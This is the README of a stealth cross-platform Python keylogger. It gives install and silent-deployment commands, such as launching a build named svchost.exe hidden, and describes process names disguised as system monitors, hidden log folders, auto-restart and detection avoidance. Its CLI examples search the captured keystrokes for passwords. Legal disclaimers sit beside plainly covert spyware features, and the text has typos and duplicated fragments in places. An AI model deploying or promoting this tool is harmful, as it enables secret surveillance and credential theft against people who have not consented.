# Advanced Keylogger with Daily Log Rotation

A sophisticated, cross-platform keylogger written in Python with advanced features including AES-256 encryption, silent background operation, automatic startup/restart capabilities, and daily log rotation with automatic cleanup.

## 🔥 Key Features

### Core Functionality
- **🔐 AES-256 Encryption**: All keystrokes are encrypted using Fernet (AES-256 in CBC mode)
- **🤫 Silent Operation**: Runs completely hidden without console windows or visible processes
- **🔄 Cross-Platform**: Works on Windows, macOS, and Linux with platform-specific deployment
- **🚀 Auto-Start**: Automatically starts with the system and restarts if crashed
- **🔑 Secure Key Derivation**: Uses PBKDF2 with SHA-256 and 100,000 iterations
- **⏰ UTC Timestamps**: Every keypress is logged with a precise UTC timestamp

### Advanced Features
- **📅 Daily Log Rotation**: Creates a new encrypted log file each day (format: `YYYY-MM-DD-log.enc`)
- **🪟 Window Title Capture**: Records the active window title with each keystroke for context
- **🗂️ Automatic Cleanup**: Archives or deletes logs older than 30 days (configurable)
- **💾 Smart Storage**: Logs stored in hidden system directories with archive management
- **🛡️ Enhanced Stealth**: Disguised process names and hidden file locations
- **🔧 Process Management**: Built-in start/stop/status functionality with auto-restart
- **📊 Log Analytics**: Comprehensive log statistics and window usage analysis tools

## 📋 Requirements

- Python 3.6+
- pynput library
- cryptography library
- psutil library (Windows only)

## ⚡ Quick Installation

### Option 1: Using Entry Point Scripts (Recommended)
```bash
# Clone or download the project
# cd keylogger

# Install dependencies
pip install -r requirements.txt

# Run the keylogger
./run_keylogger.py

# Use the CLI tool
./run_cli.py list
./run_cli.py view --date today
```

### Option 2: Direct Installation
```bash
# Install as a package
pip install -e .

# Use the installed commands
keylogger
keylogger-cli list
klog view --date today
```

### Option 3: Platform-Specific Deployment

### Windows (Hidden Executable)
```cmd
# Build hidden executable
cd deployment/windows
build_windows.bat

# Deploy silently
start /B dist\svchost.exe --silent
```

### macOS (LaunchAgent)
```bash
cd deployment/macos
chmod +x install_macos.sh
./install_macos.sh
```

### Linux (systemd Service)
```bash
cd deployment/linux
chmod +x install_linux.sh
./install_linux.sh
```

## 📖 Usage Options

### Basic Operation
```bash
# Start the keylogger (interactive mode)
python src/keylogger.py

# Start in background mode
python src/keylogger.py --background

# List available log files
python src/keylogger.py --list

# Clean up old logs manually
python src/keylogger.py --cleanup

# Set custom retention period (in days)
python src/keylogger.py --retention-days 60
```

### 🔧 Advanced CLI Tool (NEW!)

The included CLI tool provides a comprehensive interface for log analysis:

```bash
# Quick usage with the convenient wrapper
srsrc/klog list                    # List all log files
src/klog view                    # View last 7 days of logs
src/klog stats                   # Show detailed statistics
src/klog search "pattern"        # Search for specific patterns

# Advanced filtering and export
srsrc/klog list                    # List all log files
srsrc/klog view                    # View last 7 days of logs
srsrc/klog stats                   # Show usage statistics

# Advanced filtering and export
srsrc/klog view --start-date 2025-08-01 --end-date 2025-08-05
srsrc/klog view --window "Visual Studio Code" --format json
srsrc/klog view --key-pattern "password" --output results.txt
```

**CLI Features:**
- 🔐 **Secure passphrase verification** with multiple input methods
- 📅 **Flexible date range filtering** (YYYY-MM-DD format)
- 🪟 **Window title filtering** with regex support
- 📊 **Multiple export formats** (readable, JSON, CSV)
- 🔍 **Advanced pattern searching** across all log data
- 📈 **Comprehensive statistics** with window usage analysis
- 💾 **File export capabilities** for further analysis

### Log Management
```bash
# Legacy tools (still supported)
python log_utils.py --stats
python log_utils.py --windows
python log_utils.py --export
python log_utils.py --archive

# New CLI tool (recommended) 
src/klog stats                   # Enhanced statistics
src/klog view --window ".*"      # Window usage analysis
src/klog view --format csv       # Export to CSV
```

### Testing
```bash
# Test encryption functionality
python test_encryption.py

# Test silent operation
python test_silent.py

# Test auto-start functionality
python test_autostart.py

# Test log rotation
python test_log_rotation.py

# Test window title capture
python test_window_titles.py

# Run enhanced demo with window logging
python demo_window_logging.py
python test_log_rotation.py
```

### Environment Variables
```bash
# Set password for unattended operation
export KEYLOGGER_PASSWORD="your_secure_password"
python3 src/keylogger.py --silent
```

## 🔧 Configuration

### Default Settings
- **Log Directory**: `~/.local/share/syslog` (Linux/macOS), `%APPDATA%\SystemLogs` (Windows)
- **Archive Directory**: `{log_dir}/archive`
- **Log Retention**: 30 days
- **Log Format**: `YYYY-MM-DD-log.enc`
- **Encryption**: AES-256 with PBKDF2 key derivation

### Security Features
- **PBKDF2 Key Derivation**: Uses PBKDF2 with SHA-256 and 100,000 iterations for secure key derivation
- **Random Salt**: Each installation uses a unique random salt for additional security
- **Fernet Encryption**: Uses cryptography library's Fernet implementation (AES-256 in CBC mode)
- **No Plaintext Storage**: Keystrokes are never stored in plaintext on disk
- **Process Isolation**: Runs as separate background process with PID management
- **Error Containment**: Silent error handling prevents detection through error messages

## 📁 File Locations

The keylogger stores files in different locations based on the OS:

- **Windows:** `%APPDATA%\SystemLogs\`
- **macOS/Linux:** `~/.local/share/syslog/`

### Files Created
- `YYYY-MM-DD-log.enc` - Daily encrypted keylog files
- `archive/` - Directory for archived old logs
- `system.salt` - Encryption salt (keep this safe!)
- `keylogger.pid` - Process ID file for management
- `error.log` - Silent error logging

## 📅 Daily Log Rotation

The keylogger automatically creates a new encrypted log file each day with the format `YYYY-MM-DD-log.enc`. This provides several benefits:

### Benefits
- **📋 Organization**: Easy to identify logs by date
- **⚡ Performance**: Smaller individual files for faster processing
- **📂 Management**: Easier to archive or delete specific date ranges
- **🔒 Security**: Limits exposure if a single log file is compromised

### Automatic Cleanup
- Logs older than 30 days are automatically archived to `{log_dir}/archive`
- Archive files can be automatically deleted based on retention policy
- Manual cleanup available via `--cleanup` option
- Configurable retention period via `--retention-days` option

### Log File Management
```bash
# Example log directory structure
~/.local/share/syslog/
├── 2025-08-05-log.enc        # Today's log
├── 2025-08-04-log.enc        # Yesterday's log
├── 2025-08-03-log.enc        # Day before yesterday
└── archive/                  # Archived logs
    ├── 2025-07-01-log.enc    # Older logs
    └── 2025-06-15-log.enc
```

## 🔧 Platform-Specific Features

### Windows
- **Service**: Runs as a scheduled task via Task Scheduler
- **Auto-Start**: Configured to start at system boot
- **Process Name**: Disguised as "Windows Security Monitor"
- **Log Location**: `%APPDATA%\SystemLogs`

### macOS
- **Service**: Runs as a LaunchAgent
- **Auto-Start**: Configured via `~/Library/LaunchAgents`
- **Process Name**: Disguised as "System Monitor"
- **Log Location**: `~/.local/share/syslog`

### Linux
- **Service**: Runs as a systemd user service
- **Auto-Start**: Configured via `~/.config/systemd/user`
- **Process Name**: Disguised as "system-monitor"
- **Log Location**: `~/.local/share/syslog`

## 📂 File Structure

```
keylogger/
├── src/                      # Source code
│   ├── __init__.py          # Package initialization
│   ├── keylogger.py         # Main encrypted keylogger application
│   ├── keylogger_cli.py     # Comprehensive CLI tool for log analysis
│   ├── log_utils.py         # Enhanced utility functions with window analysis
│   └── klog                 # Convenient shell wrapper script
├── tests/                   # Test suites
│   ├── conftest.py          # Test configuration
│   ├── test_encryption.py   # Encryption functionality tests
│   ├── test_silent.py       # Silent operation tests
│   ├── test_autostart.py    # Auto-start functionality tests
│   ├── test_log_rotation.py # Log rotation tests
│   ├── test_window_titles.py # Window title capture tests
│   └── test_cli.py          # CLI tool tests
├── deployment/              # Platform-specific deployment files
│   ├── windows/             # Windows deployment
│   │   ├── SystemMonitoring.xml
│   │   ├── keylogger.spec
│   │   ├── build_windows.bat
│   │   └── install_windows_enhanced.bat
│   ├── macos/               # macOS deployment
│   │   ├── com.system.monitoring.plist
│   │   └── install_macos.sh
│   └── linux/               # Linux deployment
│       ├── system-monitoring@.service
│       └── install_linux.sh
├── docs/                    # Documentation
│   ├── CLI_DOCUMENTATION.md # Detailed CLI tool documentation
│   └── DEPLOYMENT.md        # Deployment guide for all platforms
├── examples/                # Example scripts and demos
│   ├── demo_log_rotation.py
│   └── demo_window_logging.py
├── run_keylogger.py         # 🆕 Main entry point script
├── run_cli.py              # 🆕 CLI entry point script
├── requirements.txt         # Python dependencies
├── setup.py                # Package setup configuration
├── pyproject.toml          # Modern Python project configuration
├── Makefile                # Build and development commands
├── .gitignore              # Git ignore rules
└── README.md               # Project documentation
```
    ├── com.system.monitor.plist  # macOS LaunchAgent config
    └── system-monitor.service    # Linux systemd config
```

## 📊 Log Format (when decrypted)

### Enhanced Format (v4.1+) with Window Title Context:
```
2025-08-05T10:30:45.123456Z - [Visual Studio Code - keylogger.py] - Key: 'a'
2025-08-05T10:30:46.234567Z - [Terminal - bash] - Special: enter
2025-08-05T10:30:47.345678Z - [Firefox - GitHub] - Special: backspace
```

### Legacy Format (v4.0 and earlier):
```
2025-08-05T10:30:45.123456Z - Key: 'a'
2025-08-05T10:30:46.234567Z - Special: enter
2025-08-05T10:30:47.345678Z - Special: backspace
```

### Window Title Benefits:
- **📝 Context**: Know exactly where keystrokes occurred
- **🔍 Analysis**: Identify most active applications
- **🕵️ Monitoring**: Track application usage patterns
- **🛡️ Security**: Detect unauthorized access attempts

## 🛠️ Management Commands

```bash
# Check if running
ps aux | grep keylogger

# View system logs (Linux)
journalctl --user -u system-monitoring@$(whoami).service

# Check LaunchAgent status (macOS)
launchctl list | grep com.system.monitoring

# Manual process management
python3 src/keylogger.py --stop
```

## 🔍 Troubleshooting

### Permission Issues
- **macOS**: Grant accessibility permissions in System Preferences → Security & Privacy → Privacy → Accessibility
- **Linux**: Ensure user has access to input devices (may need to add to `input` group)
- **Windows**: Run with appropriate user privileges

### Service Issues
- Check service logs using platform-specific tools
- Verify Python path in service configuration files
- Ensure all dependencies are installed for the correct user

### Detection Issues
- Verify process is running with `ps` or Task Manager
- Check error.log in the data directory
- Ensure proper permissions for input monitoring

## 📚 Documentation

- **[DEPLOYMENT.md](DEPLOYMENT.md)** - Comprehensive deployment guide for all platforms
- **[test_silent.py](test_silent.py)** - Test suite for silent functionality
- **[test_encryption.py](test_encryption.py)** - Encryption system tests

## ⚠️ Legal and Ethical Disclaimer

This keylogger is designed for legitimate purposes such as:
- Personal computer monitoring
- Parental controls  
- Employee monitoring (with proper disclosure)
- Security research and education

**Important Legal Notice:**
- ✅ Only use on systems you own or have explicit permission to monitor
- ✅ Comply with all local laws and regulations
- ✅ Inform users when monitoring is active (where legally required)
- ✅ Use responsibly and ethically
- ❌ Do not use for unauthorized surveillance or malicious purposes

## 📋 Changelog

### v4.2 - Advanced CLI Tool (Current)
- 🔧 **NEW**: Comprehensive CLI tool (`keylogger_cli.py`) for log analysis
- 📋 **NEW**: Convenient wrapper script (`klog`) for easy access
- 🔐 **NEW**: Advanced passphrase verification with multiple input methods
- 📅 **NEW**: Flexible date range filtering and analysis
- 🪟 **NEW**: Window title filtering with regex support
- 📊 **NEW**: Multiple export formats (readable, JSON, CSV)
- 🔍 **NEW**: Advanced pattern searching across all log data
- 📈 **NEW**: Enhanced statistics with comprehensive window analysis
- 💾 **NEW**: Secure file export capabilities
- 🧪 **NEW**: Comprehensive CLI test suite (`test_cli.py`)
- 📖 **NEW**: Detailed CLI documentation (`CLI_DOCUMENTATION.md`)

### v4.1 - Window Title Capture
- 🪟 **NEW**: Active window title capture with each keystroke
- 📊 Enhanced log format: `timestamp - [window_title] - keystroke`
- 🔍 Added window usage analysis (`--windows` option in log_utils.py)
- 🧪 Cross-platform window detection (Windows, macOS, Linux)
- ⚡ Intelligent window title caching to reduce system calls
- 📈 Enhanced export functionality with window context statistics
- 🧩 Backward compatibility with legacy log format
- 🎯 Better contextual understanding of user activity

### v4.0 - Daily Log Rotation
- ✨ Added daily log rotation with `YYYY-MM-DD-log.enc` format
- 🗂️ Implemented automatic cleanup of logs older than 30 days
- 📦 Added archive functionality for old logs
- 🔧 Enhanced command-line options (`--list`, `--cleanup`, `--retention-days`)
- 📊 Updated `log_utils.py` to handle multiple log files
- 🧪 Added comprehensive test suite for log rotation
- 📈 Improved log management with statistics and analytics

### v3.0 - Auto-Start/Restart
- 🚀 Added cross-platform auto-start functionality
- 🔄 Implemented automatic restart on crash
- 📦 Enhanced installation scripts for all platforms
- ⚙️ Added service configuration files
- 🎭 Improved process disguising and stealth operation

### v2.0 - Silent Operation
- 🤫 Added silent background operation
- 🎭 Implemented process name disguising
- 🛡️ Enhanced stealth capabilities
- 🧪 Added comprehensive testing suite

### v1.0 - Basic Keylogger with Encryption
- 🔐 Initial keylogger implementation using pynput
- 🔒 AES-256 encryption with Fernet
- 🔄 Cross-platform compatibility
- 📊 Basic log management utilities

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Ensure all tests pass
5. Submit a pull request

---

**This project is for educational and authorized testing purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.**

## 🗑️ Uninstallation

Each platform has specific uninstallation procedures detailed in [DEPLOYMENT.md](DEPLOYMENT.md). Generally involves:

1. Stopping the service/process
2. Removing auto-start configurations  
3. Deleting application files and logs
4. Cleaning up system configurations

---

**Disclaimer**: This tool is for educational and legitimate monitoring purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. The encryption is designed to protect the logged data, but users should handle the tool responsibly and in accordance with privacy laws.
